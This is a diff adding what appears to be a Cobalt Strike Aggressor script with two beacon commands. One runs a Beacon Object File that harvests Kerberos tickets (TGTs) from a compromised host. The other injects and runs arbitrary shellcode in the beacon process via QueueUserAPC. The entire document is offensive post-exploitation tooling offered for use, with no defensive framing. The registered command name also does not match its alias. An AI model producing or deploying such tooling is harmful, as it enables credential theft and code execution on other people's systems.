@@ -1,0 +1,50 @@
+beacon_command_register(
+	"extract-tickets",
+	"Extract Kerberos tickets",
+	"Usage: extract-tickets",
+);
+	
+alias extract-tickets {
+    $bid = $1;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("ticket_extractor." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    blog($bid, "Tasked to harvest TGTs");
+    beacon_inline_execute($bid, $data, "go", $null);
+}
+
+beacon_command_register(
+	"execute-shellcode-queueuserapc",
+	"Execute shellcode in the current process using QueueUserAPC",
+	"Usage: execute-shellcode-queueuserapc <local path to shellcode>",
+);
+	
+alias execute-shellcode {
+    $bid = $1;
+
+    # Check if args are passed
+    if(size(@_) != 2) {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("execute-shellcode"));
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("shellcode." . barch($bid) . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Read the shellcode
+    $sc_fh = openf($2);
+    $sc_data = readb($sc_fh, -1);
+    closef($sc_fh);
+
+    # Pack our arguments
+    $args = bof_pack($bid, "b", $sc_data);
+
+    blog($bid, "Tasked to execute shellcode in the current process");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
